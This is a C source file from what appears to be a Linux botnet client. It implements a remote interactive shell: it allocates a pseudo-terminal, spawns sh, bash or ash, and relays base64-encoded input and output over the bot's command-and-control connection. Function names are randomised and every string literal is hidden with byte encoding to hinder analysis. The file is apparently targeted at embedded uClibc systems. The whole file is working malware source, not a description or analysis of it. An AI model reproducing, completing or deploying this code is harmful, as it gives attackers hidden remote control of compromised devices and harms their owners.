/* ==========================================================================
 *  pty.c -- Full PTY shell session for interactive web terminal
 *  Manual PTY allocation via /dev/ptmx — no libutil, no <pty.h>.
 *  Works on GCC 4.1.2 / C89+C99, uClibc, all Linux archs.
 * ========================================================================== */

#include "bot.h"
#include <sys/ioctl.h>
#include <sys/select.h>
#include <termios.h>
#include <signal.h>
#include <fcntl.h>

/* Global PTY state — one PTY session per bot (single C2 connection) */
static int       pty_master_fd = -1;
static pid_t     pty_child_pid = -1;
static pthread_t pty_reader_tid;
static int       pty_active = 0;
static _EA8up4M *pty_conn = NULL;

#define PTY_DATA_PREFIX "PTY_DATA "
#define PTY_DATA_PREFIX_LEN 9
#define PTY_CLOSED_MSG  "PTY_CLOSED"

/* Simple base64 encode for PTY output */
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t pty_b64_encode(const unsigned char *in, size_t len, char *out) {
    size_t i, j;
    unsigned int v;
    j = 0;
    for (i = 0; i < len; i += 3) {
        v  = (unsigned int)in[i] << 16;
        if (i + 1 < len) v |= (unsigned int)in[i+1] << 8;
        if (i + 2 < len) v |= (unsigned int)in[i+2];
        out[j++] = b64_table[(v >> 18) & 0x3F];
        out[j++] = b64_table[(v >> 12) & 0x3F];
        out[j++] = (i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=';
        out[j++] = (i + 2 < len) ? b64_table[v & 0x3F] : '=';
    }
    out[j] = '\0';
    return j;
}

/* --------------------------------------------------------------------------
 * Manual PTY allocation via /dev/ptmx (no libutil needed)
 * Returns master fd, writes slave path to slavepath (must be >= 64 bytes)
 * Returns -1 on failure.
 * -------------------------------------------------------------------------- */
static int pty_open_master(char *slavepath) {
    int master;
    int unlock = 0;
    int pty_num = 0;

    master = open(_S(9,0x83,0xc8,0xc9,0xda,0x83,0xdc,0xd8,0xc1,0xd4), O_RDWR | O_NOCTTY);
    if (master < 0) return -1;

    /* Unlock the slave */
    if (ioctl(master, TIOCSPTLCK, &unlock) < 0) {
        close(master);
        return -1;
    }

    /* Get the slave pty number */
    if (ioctl(master, TIOCGPTN, &pty_num) < 0) {
        close(master);
        return -1;
    }

    snprintf(slavepath, 64, _S(11,0x83,0xc8,0xc9,0xda,0x83,0xdc,0xd8,0xdf,0x83,0x89,0xc8), pty_num);
    return master;
}

/* --------------------------------------------------------------------------
 * PTY reader thread — reads from pty master fd and sends base64 to CNC
 * -------------------------------------------------------------------------- */
static void *pty_reader_thread(void *arg) {
    unsigned char readbuf[3072];
    char b64buf[4100];
    char sendbuf[4096 + PTY_DATA_PREFIX_LEN + 1];
    ssize_t n;
    size_t b64len;
    (void)arg;

    memcpy(sendbuf, PTY_DATA_PREFIX, PTY_DATA_PREFIX_LEN);

    while (pty_active && pty_master_fd >= 0) {
        fd_set rfds;
        struct timeval tv;

        FD_ZERO(&rfds);
        FD_SET(pty_master_fd, &rfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(pty_master_fd + 1, &rfds, NULL, NULL, &tv) <= 0)
            continue;

        n = read(pty_master_fd, readbuf, sizeof(readbuf));
        if (n <= 0) break;

        b64len = pty_b64_encode(readbuf, (size_t)n, b64buf);
        memcpy(sendbuf + PTY_DATA_PREFIX_LEN, b64buf, b64len);
        Jf8pY4F(pty_conn, sendbuf, PTY_DATA_PREFIX_LEN + b64len);
    }

    if (pty_conn && pty_conn->valid) {
        Ng2ZR5y(pty_conn, PTY_CLOSED_MSG);
    }

    pty_active = 0;
    return NULL;
}

/* --------------------------------------------------------------------------
 * Pz9Pty4W — Open PTY session (CMD_PTY handler)
 * Manual forkpty: open /dev/ptmx, fork, child opens slave as controlling tty.
 * -------------------------------------------------------------------------- */
void Pz9Pty4W(_EA8up4M *c) {
    int master, slave;
    pid_t pid;
    char slavepath[64];
    struct winsize ws;

    if (pty_active && pty_master_fd >= 0) {
        Ng2ZR5y(c, _S(16,0xfc,0xf8,0xf5,0xf3,0xed,0xe0,0xfe,0xe9,0xed,0xe8,0xf5,0xf3,0xe3,0xfc,0xe9,0xe2));
        return;
    }

    master = pty_open_master(slavepath);
    if (master < 0) {
        Ng2ZR5y(c, _S(26,0xfc,0xf8,0xf5,0xf3,0xe9,0xfe,0xfe,0xe3,0xfe,0x8c,0xdc,0xd8,0xc1,0xd4,0x8c,0xc3,0xdc,0xc9,0xc2,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
        return;
    }

    ws.ws_row = 24;
    ws.ws_col = 80;
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    pid = fork();
    if (pid < 0) {
        close(master);
        Ng2ZR5y(c, _S(21,0xfc,0xf8,0xf5,0xf3,0xe9,0xfe,0xfe,0xe3,0xfe,0x8c,0xca,0xc3,0xde,0xc7,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
        return;
    }

    if (pid == 0) {
        /* ── Child ── */
        char *shell = _S(7,0x83,0xce,0xc5,0xc2,0x83,0xdf,0xc4);
        char *env[] = {
            _S(19,0xf8,0xe9,0xfe,0xe1,0x91,0xd4,0xd8,0xc9,0xde,0xc1,0x81,0x9e,0x99,0x9a,0xcf,0xc3,0xc0,0xc3,0xde),
            _S(6,0xe4,0xe3,0xe1,0xe9,0x91,0x83),
            _S(65,0xfc,0xed,0xf8,0xe4,0x91,0x83,0xd9,0xdf,0xde,0x83,0xc0,0xc3,0xcf,0xcd,0xc0,0x83,0xdf,0xce,0xc5,0xc2,0x96,0x83,0xd9,0xdf,0xde,0x83,0xc0,0xc3,0xcf,0xcd,0xc0,0x83,0xce,0xc5,0xc2,0x96,0x83,0xd9,0xdf,0xde,0x83,0xdf,0xce,0xc5,0xc2,0x96,0x83,0xd9,0xdf,0xde,0x83,0xce,0xc5,0xc2,0x96,0x83,0xdf,0xce,0xc5,0xc2,0x96,0x83,0xce,0xc5,0xc2),
            NULL
        };

        close(master);

        /* Create new session, become session leader */
        setsid();

        /* Open slave — becomes controlling terminal */
        slave = open(slavepath, O_RDWR);
        if (slave < 0) _exit(1);

        /* Set as controlling tty */
        ioctl(slave, TIOCSCTTY, 0);

        /* Set window size */
        ioctl(slave, TIOCSWINSZ, &ws);

        /* Redirect stdio to slave pty */
        dup2(slave, STDIN_FILENO);
        dup2(slave, STDOUT_FILENO);
        dup2(slave, STDERR_FILENO);
        if (slave > 2) close(slave);

        /* Try better shells */
        if (access(_S(9,0x83,0xce,0xc5,0xc2,0x83,0xce,0xcd,0xdf,0xc4), X_OK) == 0) shell = _S(9,0x83,0xce,0xc5,0xc2,0x83,0xce,0xcd,0xdf,0xc4);
        else if (access(_S(8,0x83,0xce,0xc5,0xc2,0x83,0xcd,0xdf,0xc4), X_OK) == 0) shell = _S(8,0x83,0xce,0xc5,0xc2,0x83,0xcd,0xdf,0xc4);

        execle(shell, shell, _S(2,0x81,0xc5), (char *)NULL, env);
        _exit(1);
    }

    /* ── Parent ── */
    pty_master_fd = master;
    pty_child_pid = pid;
    pty_conn = c;
    pty_active = 1;

    pthread_create(&pty_reader_tid, NULL, pty_reader_thread, NULL);
    pthread_detach(pty_reader_tid);

    Ng2ZR5y(c, _S(10,0xfc,0xf8,0xf5,0xf3,0xe3,0xfc,0xe9,0xe2,0xe9,0xe8));
}

/* --------------------------------------------------------------------------
 * Ry3PtyIn — Write data to PTY (CMD_PTYDATA handler)
 * Input is base64-encoded (CNC encodes to preserve \r \n \0 etc)
 * -------------------------------------------------------------------------- */
static int b64_decode_char(unsigned char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static size_t pty_b64_decode(const char *in, size_t inlen, unsigned char *out) {
    size_t i, j = 0;
    int v;
    for (i = 0; i + 3 < inlen; i += 4) {
        int a = b64_decode_char((unsigned char)in[i]);
        int b = b64_decode_char((unsigned char)in[i+1]);
        int c2 = b64_decode_char((unsigned char)in[i+2]);
        int d = b64_decode_char((unsigned char)in[i+3]);
        if (a < 0 || b < 0) break;
        v = (a << 18) | (b << 12);
        out[j++] = (unsigned char)(v >> 16);
        if (c2 >= 0) {
            v |= (c2 << 6);
            out[j++] = (unsigned char)((v >> 8) & 0xFF);
            if (d >= 0) {
                v |= d;
                out[j++] = (unsigned char)(v & 0xFF);
            }
        }
    }
    return j;
}

void Ry3PtyIn(const char *data, size_t len) {
    unsigned char decoded[4096];
    size_t dlen;
    size_t off = 0;
    ssize_t n;

    if (!pty_active || pty_master_fd < 0 || !data || len == 0) return;

    dlen = pty_b64_decode(data, len, decoded);
    if (dlen == 0) return;

    while (off < dlen) {
        n = write(pty_master_fd, decoded + off, dlen - off);
        if (n <= 0) break;
        off += (size_t)n;
    }
}
